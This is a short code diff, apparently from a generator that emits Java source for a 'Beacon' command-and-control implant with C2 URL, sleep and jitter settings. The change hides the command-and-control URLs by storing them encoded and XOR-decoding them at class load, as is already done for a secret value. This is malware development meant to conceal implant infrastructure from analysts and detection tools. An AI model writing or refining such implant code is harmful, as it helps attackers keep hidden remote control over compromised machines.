@@ -2203,9 +2203,14 @@ import java.security.cert.X509Certificate;
 public class Beacon {
 
     private static final String XK = "${xk}";
-    private static final String[] C2_URLS = { ${eUrls.map(e => `"${e}"`).join(', ')} };
+    private static final String[] _ENC_URLS = { ${eUrls.map(e => `"${e}"`).join(', ')} };
+    private static final String[] C2_URLS;
     private static final String SECRET;
-    static { SECRET = xDec("${es}", XK); }
+    static {
+        SECRET = xDec("${es}", XK);
+        C2_URLS = new String[_ENC_URLS.length];
+        for (int i = 0; i < _ENC_URLS.length; i++) C2_URLS[i] = xDec(_ENC_URLS[i], XK);
+    }
 
     private static final int SLEEP  = ${sleep};
     private static final int JITTER = ${jitter};
